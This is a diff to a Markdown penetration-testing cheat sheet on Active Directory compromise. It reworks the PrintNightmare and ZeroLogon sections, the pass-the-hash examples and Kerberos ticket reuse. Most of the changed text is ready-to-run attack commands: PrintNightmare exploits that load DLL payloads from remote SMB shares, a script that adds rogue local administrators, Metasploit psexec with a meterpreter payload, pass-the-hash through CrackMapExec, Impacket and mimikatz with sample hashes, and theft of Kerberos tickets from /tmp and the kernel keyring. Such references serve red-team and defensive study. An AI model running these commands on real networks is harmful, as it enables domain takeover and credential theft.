@@ -12,8 +12,8 @@
   - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
     - [From CVE to SYSTEM shell on DC](#from-cve-to-system-shell-on-dc)
-      - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
-      - [CVE-2021-1675 PrintNightmare](#cve-2021-1675-printnightmare)
+      - [ZeroLogon](#zerologon)
+      - [PrintNightmare](#printnightmare)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
@@ -506,7 +506,9 @@ Windows> net time /domain /set
 > Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a "normal user" shell on the DC you can also try to elevate your privileges using one of the methods listed in [Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 
-#### CVE-2020-1472 ZeroLogon
+#### ZeroLogon
+
+> CVE-2020-1472
 
 White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055
 
@@ -578,7 +580,9 @@ Exploit steps from the white paper
   lsadump::postzerologon /target:10.10.10.10 /account:DC01$
   ```
 
-#### CVE-2021-1675 - CVE-2021-34527 - PrintNightmare
+#### PrintNightmare
+
+> CVE-2021-1675 / CVE-2021-34527
 
 The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
 The exploit will execute the DLL either from the local filesystem or a remote share.
@@ -591,39 +595,59 @@ Requirements:
 * Server with registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0
 
 
-```powershell
-# https://github.com/cube0x0/CVE-2021-1675 - require a modified Impacket: https://github.com/cube0x0/impacket
-python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
-python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
-## LPE
-SharpPrintNightmare.exe C:\addCube.dll
-## RCE using existing context
-SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
-## RCE using runas /netonly
-SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
+**Detect the vulnerability**:
+* Impacket - [rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)
+  ```ps1
+  python3 ./rpcdump.py @10.0.2.10 | grep MS-RPRN
+  Protocol: [MS-RPRN]: Print System Remote Protocol
+  ```
+* [It Was All A Dream](https://github.com/byt3bl33d3r/ItWasAllADream) 
+  ```ps1
+  git clone https://github.com/byt3bl33d3r/ItWasAllADream
+  cd ItWasAllADream && poetry install && poetry shell
+  itwasalladream -u user -p password -d domain 192.168.1.0/24
+  ```
 
-# https://github.com/calebstewart/CVE-2021-1675
-## LPE only (PS1 + DLL)
-Import-Module .\cve-2021-1675.ps1
-Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
-Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
-Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
+**Trigger the exploit**: 
 
-# Mimikatz - https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210705
-## LPE
-misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
-## RCE
-misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
+**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109): `python3 ./smbserver.py share /tmp/smb/`
 
-# It Was All A Dream - https://github.com/byt3bl33d3r/ItWasAllADream
-# PrintNightmare scanner/checker (no exploit)
-## RCE only
-git clone https://github.com/byt3bl33d3r/ItWasAllADream
-cd ItWasAllADream && poetry install && poetry shell
-itwasalladream -u user -p password -d domain 192.168.1.0/24
-```
+* [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)
+  ```powershell
+  # require a modified Impacket: https://github.com/cube0x0/impacket
+  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
+  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
+  ## LPE
+  SharpPrintNightmare.exe C:\addCube.dll
+  ## RCE using existing context
+  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
+  ## RCE using runas /netonly
+  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
+  ```
+* [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)
+  ```powershell
+  ## LPE only (PS1 + DLL)
+  Import-Module .\cve-2021-1675.ps1
+  Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
+  Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
+  Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
+  ```
+* [Mimikatz v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)
+  ```powershell
+  ## LPE
+  misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
+  ## RCE
+  misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
+  ```
 
-**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109) .
+**Debug informations**
+
+| Error  | Message             | Debug                                    |
+|--------|---------------------|------------------------------------------|
+| 0x5    | rpc_s_access_denied | Permissions on the file in the SMB share |
+| 0x525  | ERROR_NO_SUCH_USER  | The specified account does not exist.    |
+| 0x180  | unknown error code  | Share is not SMB2                        |
+
 
 ### Open Shares
 
@@ -1482,35 +1506,31 @@ Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.
 
 The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.
 
-```powershell
-use exploit/windows/smb/psexec
-set RHOST 10.2.0.3
-set SMBUser jarrieta
-set SMBPass nastyCutt3r  
-# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
-# NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
-set PAYLOAD windows/meterpreter/bind_tcp
-run
-shell
-```
-
-or with crackmapexec
-
-```powershell
-cme smb 10.2.0.2 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
-also works with net range : cme smb 10.2.0.2/24 ... 
-```
-
-or with psexec
-
-```powershell
-proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
-```
-
-or with the builtin Windows RDP and mimikatz
-```powershell
-sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
-```
+* Metasploit
+  ```powershell
+  use exploit/windows/smb/psexec
+  set RHOST 10.2.0.3
+  set SMBUser jarrieta
+  set SMBPass nastyCutt3r  
+  # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
+  # NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
+  set PAYLOAD windows/meterpreter/bind_tcp
+  run
+  shell
+  ```
+* CrackMapExec
+  ```powershell
+  cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
+  ```
+* Impacket suite
+  ```powershell
+  proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
+  ```
+* Windows RDP and mimikatz
+  ```powershell
+  sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
+  sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:"mstsc.exe /restrictedadmin"
+  ```
 
 You can extract the local **SAM database** to find the local administrator hash :
 
@@ -2601,15 +2621,30 @@ Navigate to any web application that is integrated with our AAD domain. Once at 
 
 ### CCACHE ticket reuse from /tmp
 
-List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`
-
 > When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
+
+List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID. 
+
+```powershell
+$ ls /tmp/ | grep krb5cc
+krb5cc_1000
+krb5cc_1569901113
+krb5cc_1569901115
+
+$ export KRB5CCNAME=/tmp/krb5cc_1569901115
+```
+
 
 ### CCACHE ticket reuse from keyring
 
 Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey
 
 ```powershell
+# Configuration and build
+git clone https://github.com/TarlogicSecurity/tickey
+cd tickey/tickey
+make CONF=Release
+
 [root@Lab-LSV01 /]# /tmp/tickey -i
 [*] krb5 ccache_name = KEYRING:session:sess_%{uid}
 [+] root detected, so... DUMP ALL THE TICKETS!!
@@ -2770,3 +2805,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
 * [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
 * [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab#Previous%20Work)
+* [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
+* [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
